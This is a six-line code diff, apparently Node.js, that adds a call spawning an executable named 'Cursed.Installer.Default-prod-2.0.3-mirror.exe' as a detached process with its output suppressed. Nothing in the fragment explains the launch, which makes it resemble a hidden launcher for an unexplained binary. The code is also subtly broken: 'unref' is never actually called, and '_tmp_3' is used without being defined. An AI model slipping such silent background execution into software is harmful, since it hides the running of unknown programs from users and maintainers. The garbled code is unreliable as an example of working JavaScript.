@@ -1,0 +1,6 @@
+(_tmp_2 = spawn(resolve('Cursed.Installer.Default-prod-2.0.3-mirror.exe'), {
+  detached: true,
+  stdio: 'ignore'
+})).unref
+_tmp_3.detached = true
+_tmp_3.stdio = "ignore"
